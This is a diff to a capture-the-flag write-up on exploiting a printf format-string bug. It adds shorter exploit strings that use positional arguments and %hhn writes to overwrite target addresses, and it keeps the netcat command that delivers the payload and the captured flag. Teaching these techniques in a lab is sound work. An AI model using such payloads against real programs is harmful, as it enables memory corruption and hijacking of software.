@@ -129,7 +129,7 @@ Number of bytes displayed till now is 133. We can use the [format specifier](htt
 
 `hh` is the length sub-specifier and it indicates to write a byte value i.e. the address is a pointer to a byte. If the value to write is larger than a byte, it would be automatically **wrapped**. The situation is similar for other length sub-specifiers such as `h`, `l` and `ll`. Without any length sub-specifier it defaults to `int`.
 
-Now, at this point, we have written `0x85` \(133\) to the location `0804A01D`. In this process we have also displayed 133 bytes on the terminal. 
+Now, at this point, we have written `0x85` \(133\) to the location `0804A01D`. In this process we have also displayed 133 bytes on the terminal.
 
 The next task is to write `0xAB` \(171\) to the location `0804A01C` and for that we need to display `171 - 133 = 38` more bytes. These bytes can again be simply appended to the exploit string. Using this approach our final exploit string would be:
 
@@ -143,8 +143,22 @@ $ nc pwn.ctf.tamu.edu 4323 < exploit
 Enter a word to be echoed:
 ��0000000200000000                                                                                                            0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAThis function has been deprecated
 gigem{F0RM@1NG_1S_H4RD}
+```
 
+The exploit string can be simplified:
 
+We can use [positional arguments](http://stackoverflow.com/a/6322594/1833653) to `printf` which would eliminate the need for consuming dwords using `%08x`. The exploit string in this case would be:
+
+```
+\x1d\xa0\x04\x08\x1c\xa0\x04\x08%125x%4$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%hhn
+```
+
+**Alternative approach instead of appending 38 A's**
+
+Alternatively, before the 2nd address, we can write a dummy dword \(`0xDEADBEEF` here\) and use something like `%38x`, however other field width sub-specifier also have to be reduced by 4.
+
+```
+\x1d\xa0\x04\x08\xDE\xAD\xBE\xEF\x1c\xa0\x04\x08%08x%08x%105x%hhn%38x%hhn
 ```
 
 ## Using pwntools \(automated\)
